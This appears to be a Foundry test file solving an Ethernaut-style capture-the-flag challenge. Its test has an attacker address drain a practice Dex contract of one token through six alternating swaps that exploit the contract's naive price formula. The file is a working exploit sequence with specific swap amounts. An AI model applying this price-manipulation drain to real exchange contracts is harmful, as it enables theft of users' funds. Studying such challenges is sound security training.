// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Swap.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexTest is Test {
    SwappableToken public swappabletokenA;
    SwappableToken public swappabletokenB;
    Dex public dex;
    address attacker = makeAddr("attacker");

    ///DO NOT TOUCH!!!
    function setUp() public {
        dex = new Dex();
        swappabletokenA = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletokenA), "Token 1");
        swappabletokenB = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletokenB), "Token 2");
        dex.setTokens(address(swappabletokenA), address(swappabletokenB));

        dex.approve(address(dex), 100);
        dex.addLiquidity(address(swappabletokenA), 100);
        dex.addLiquidity(address(swappabletokenB), 100);

        IERC20(address(swappabletokenA)).transfer(attacker, 10);
        IERC20(address(swappabletokenB)).transfer(attacker, 10);
        vm.label(attacker, "Attacker");
    }

    function test_drainTokenA() public {
        vm.startPrank(attacker);
        
        // Approve DEX to spend tokens
        swappabletokenA.approve(address(dex), type(uint256).max);
        swappabletokenB.approve(address(dex), type(uint256).max);

        // Log initial state
        console.log("\nInitial state:");
        logState();

        // First swap: token1 -> token2
        console.log("\nStarting attack sequence...");
        
        // Execute the drain through multiple swaps
        dex.swap(address(swappabletokenA), address(swappabletokenB), 10);
        console.log("\nAfter swap 1:");
        logState();

        dex.swap(address(swappabletokenB), address(swappabletokenA), 20);
        console.log("\nAfter swap 2:");
        logState();

        dex.swap(address(swappabletokenA), address(swappabletokenB), 24);
        console.log("\nAfter swap 3:");
        logState();

        dex.swap(address(swappabletokenB), address(swappabletokenA), 30);
        console.log("\nAfter swap 4:");
        logState();

        dex.swap(address(swappabletokenA), address(swappabletokenB), 41);
        console.log("\nAfter swap 5:");
        logState();

        dex.swap(address(swappabletokenB), address(swappabletokenA), 45);
        console.log("\nFinal state:");
        logState();

        vm.stopPrank();

        // Verify Token A has been drained
        assertEq(IERC20(address(swappabletokenA)).balanceOf(address(dex)), 0, "DEX should have 0 Token A");
    }

    function logState() internal view {
        console.log("DEX Token A balance:", IERC20(address(swappabletokenA)).balanceOf(address(dex)));
        console.log("DEX Token B balance:", IERC20(address(swappabletokenB)).balanceOf(address(dex)));
        console.log("Attacker Token A balance:", IERC20(address(swappabletokenA)).balanceOf(attacker));
        console.log("Attacker Token B balance:", IERC20(address(swappabletokenB)).balanceOf(attacker));
    }
}
